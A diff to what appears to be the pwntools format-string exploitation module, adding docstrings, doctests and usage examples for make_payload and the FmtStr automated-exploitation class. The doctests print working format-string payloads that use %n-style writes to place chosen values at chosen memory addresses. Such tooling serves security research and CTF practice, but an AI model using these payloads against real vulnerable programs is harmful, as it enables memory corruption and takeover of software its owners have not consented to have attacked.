@@ -1,6 +1,24 @@
 """
 Provide some tools to exploit format string bug
 
+Example - Payload generation
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+::
+
+    # we want to do 3 writes
+    writes = [(0x08041337,   0xbfffffff),
+              (0x08041337+4, 0x1337babe),
+              (0x08041337+8, 0xdeadbeef)]
+
+    # the printf() call already writes some bytes
+    # for example :
+    # strcat(dest, "blabla :", 256);
+    # strcat(dest, your_input, 256);
+    # printf(dest);
+    # Here, numbwritten parameter must be 8
+    payload = fmtstr.make_payload(5, writes, numbwritten=8)
+
 Example - Automated exploitation
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
@@ -37,13 +55,27 @@ from pwnlib.util.packing import *
 log = getLogger(__name__)
 
 def make_payload(offset, writes, numbwritten=0, nformater=4):
-    """
-    make the payload needed
-    offset is the number of the formatter
-    where is the addr where write what
-    what is what whe want to write at where
-    numbwritten is the number of bytes already written
-    nformater is the number of formatter needed, must be 1, 2 or 4
+    """make_payload(offset, writes, numbwritten=0, nformater=4) -> str
+
+    Makes payload with given parametersself.
+
+    Arguments:
+        offset(int): the first formatter's offset you control
+        writes(list): list of tuple, each tuple must be composed as ``(where, what)``
+        numbwritten(int): number of byte already written by the printf function
+        nformater(int): must be 4, 2 or 1. Tells if you want to write byte by byte, short by short or directly an int
+
+    Returns:
+        The payload in order to do needed writes
+
+    Examples:
+        >>> fmtstr.make_payload(1, [(0x0, 0x1337babe)])
+        '\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00%174c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn'
+        >>> fmtstr.make_payload(1, [(0x0, 0x1337babe)], nformater=2)
+        '\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00%47798c%1$hn%22649c%2$hn'
+        >>> fmtstr.make_payload(1, [(0x0, 0x1337babe)], nformater=1)
+        '\\x00\\x00\\x00\\x00%322419386c%1$n'
+
     """
 
     for where, what in writes:
@@ -81,7 +113,36 @@ def make_payload(offset, writes, numbwritten=0, nformater=4):
     return payload
 
 class FmtStr(object):
+    """
+    Provides an automated format string exploitation.
+
+    It takes a function which is called every time the automated
+    process want to communicate with the vulnerable process. this
+    function takes a parameter with the payload that you have to
+    send to the vulnerable process and must return the process
+    returns.
+
+    If the `offset` parameter is not given, he try to find the right
+    offset by leaking stack datas.
+
+    Arguments:
+            execute_fmt(function): function to call for communicate with the vulnerable process
+            offset(int): the first formatter's offset you control
+            padlen(int): size of the pad you want to add before the payload
+            numbwritten(int): number of already written bytes
+
+    """
+
     def __init__(self, execute_fmt, offset = None, padlen = 0, numbwritten = 0):
+        """
+        Instantiates an object which try to automating exploit the vulnerable process
+
+        Arguments:
+            execute_fmt(function): function to call for communicate with the vulnerable process
+            offset(int): the first formatter's offset you control
+            padlen(int): size of the pad you want to add before the payload
+            numbwritten(int): number of already written bytes
+        """
         self.execute_fmt = execute_fmt
         self.offset = offset
         self.padlen = padlen
@@ -137,10 +198,30 @@ class FmtStr(object):
         return leak
 
     def execute_writes(self):
+        """execute_writes() -> None
+
+        Makes payload and send it to the vulnerable process
+
+        Returns:
+            None
+
+        """
         fmtstr = randoms(self.padlen)
         fmtstr += make_payload(self.offset, self.writes, numbwritten=self.padlen, nformater=4)
         self.execute_fmt(fmtstr)
         self.writes = []
 
     def write(self, addr, data):
+        """write(addr, data) -> None
+
+        In order to tell : I want to write ``data`` at ``addr``.
+
+        Arguments:
+            addr(int): the address where you want to write
+            data(int): the data that you want to write ``addr``
+
+        Returns:
+            None
+
+        """
         self.writes.append((addr, data))
